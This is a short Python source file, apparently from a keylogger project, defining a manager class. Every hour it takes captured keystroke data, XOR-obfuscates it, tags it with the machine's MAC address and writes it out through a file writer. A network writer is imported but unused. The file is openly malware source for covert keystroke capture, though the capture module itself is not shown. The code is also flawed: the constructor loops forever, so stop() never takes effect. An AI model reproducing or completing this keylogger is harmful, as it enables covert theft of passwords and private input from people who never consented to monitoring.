from keylogger_service import KeyloggerService
from encryptor import Encryptor
from writer import Iwriter
from file_wirter import FileWriter
from network_writer import NetworkWriter
import time
from getmac import get_mac_address

class KeyloggerManager:

    def __init__(self):
        self.active = True
        self.keylogger = KeyloggerService()
        self.encryptor = Encryptor()
        self.file_writer = FileWriter()
        self.main()


    def main(self):
        while self.active:
            data = self.keylogger.data
            data = self.encryptor.xor(data)
            # אולי עדיף להצפין את ה-mac
            mac_name = self.get_mac()
            wrapper = {mac_name : data}
            #
            self.file_writer.send_data(wrapper)
            time.sleep(3600)

    def stop(self):
        self.active = False

    @staticmethod
    def get_mac():
        return get_mac_address()

